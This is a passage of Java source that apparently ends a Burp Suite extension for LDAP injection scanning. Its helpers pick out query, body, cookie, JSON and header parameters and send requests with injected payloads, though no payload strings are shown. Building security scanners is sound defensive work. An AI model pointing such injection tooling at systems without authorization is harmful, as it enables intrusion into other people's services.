    private static final Pattern TIMESTAMP_PATTERN = Pattern.compile(
            "\\b\\d{10,13}\\b"); // Unix timestamps
    private static final Pattern SESSION_ID_PATTERN = Pattern.compile(
            "(?:session|sid|jsessionid|phpsessid|aspsessionid)\\s*[=:]\\s*[\"']?[a-zA-Z0-9+/=_-]{16,}[\"']?",
            Pattern.CASE_INSENSITIVE);

    private String stripDynamicContent(String body) {
        body = CSRF_TOKEN_PATTERN.matcher(body).replaceAll("[CSRF_TOKEN]");
        body = TIMESTAMP_PATTERN.matcher(body).replaceAll("[TIMESTAMP]");
        body = SESSION_ID_PATTERN.matcher(body).replaceAll("[SESSION]");
        return body;
    }

    // ==================== HELPERS ====================

    private boolean isAuthParameter(String paramName) {
        String lower = paramName.toLowerCase();
        for (String auth : AUTH_PARAM_NAMES) {
            if (lower.equals(auth) || lower.contains(auth)) return true;
        }
        return false;
    }

    private HttpRequestResponse sendPayload(HttpRequestResponse original, LdapTarget target, String payload) {
        try {
            HttpRequest modified;
            switch (target.type) {
                case QUERY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
                    break;
                case BODY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
                    break;
                case COOKIE:
                    modified = PayloadEncoder.injectCookie(original.request(), target.name, payload);
                    break;
                case JSON:
                    modified = injectJsonPayload(original.request(), target.name, payload);
                    break;
                case HEADER:
                    modified = original.request().withRemovedHeader(target.name)
                            .withAddedHeader(target.name, payload);
                    break;
                default:
                    return null;
            }
            HttpRequestResponse result = api.http().sendRequest(modified);
            if (!ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            api.logging().logToError("[LDAPI] sendPayload failed: " + e.getMessage());
            return null;
        }
    }

    private HttpRequest injectJsonPayload(HttpRequest request, String dotKey, String payload) {
        try {
            String body = request.bodyToString();
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(body);
            if (!root.isJsonObject()) return request;

            String[] parts = dotKey.split("\\.");
            if (parts.length == 1) {
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                String pattern = "\"" + java.util.regex.Pattern.quote(dotKey) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                return request.withBody(body.replaceFirst(pattern, "\"" + dotKey + "\": \"" + escaped + "\""));
            }

            com.google.gson.JsonObject current = root.getAsJsonObject();
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return request;
                current = child.getAsJsonObject();
            }
            current.addProperty(parts[parts.length - 1], payload);
            return request.withBody(new com.google.gson.Gson().toJson(root));
        } catch (Exception e) {
            return request;
        }
    }

    private List<LdapTarget> extractTargets(HttpRequest request) {
        List<LdapTarget> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new LdapTarget(param.name(), param.value(), LdapTargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new LdapTarget(param.name(), param.value(), LdapTargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new LdapTarget(param.name(), param.value(), LdapTargetType.COOKIE));
                    break;
            }
        }

        // JSON body parameters
        String contentType = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { contentType = h.value(); break; }
        }
        if (contentType.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null && !body.isBlank()) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonTargets(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        // Extract ALL injectable request headers (skip non-injectable framework headers)
        Set<String> skipHeaders = Set.of("host", "content-length", "connection", "accept-encoding",
                "sec-fetch-mode", "sec-fetch-site", "sec-fetch-dest", "sec-fetch-user",
                "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                "upgrade-insecure-requests", "if-modified-since", "if-none-match",
                "cookie"); // individual cookies already extracted as COOKIE parameters
        for (var h : request.headers()) {
            if (!skipHeaders.contains(h.name().toLowerCase())) {
                targets.add(new LdapTarget(h.name(), h.value(), LdapTargetType.HEADER));
            }
        }

        return targets;
    }

    private void extractJsonTargets(com.google.gson.JsonObject obj, String prefix, List<LdapTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
                targets.add(new LdapTarget(fullKey, val.getAsString(), LdapTargetType.JSON));
            } else if (val.isJsonObject()) {
                extractJsonTargets(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("ldapi.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private static String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }

    @Override
    public void destroy() {
        confirmedParams.clear();
    }

    // ==================== INNER TYPES ====================

    private enum LdapTargetType { QUERY, BODY, COOKIE, JSON, HEADER }

    private static class LdapTarget {
        final String name, originalValue;
        final LdapTargetType type;
        LdapTarget(String n, String v, LdapTargetType t) {
            name = n;
            originalValue = v != null ? v : "";
            type = t;
        }
    }
}
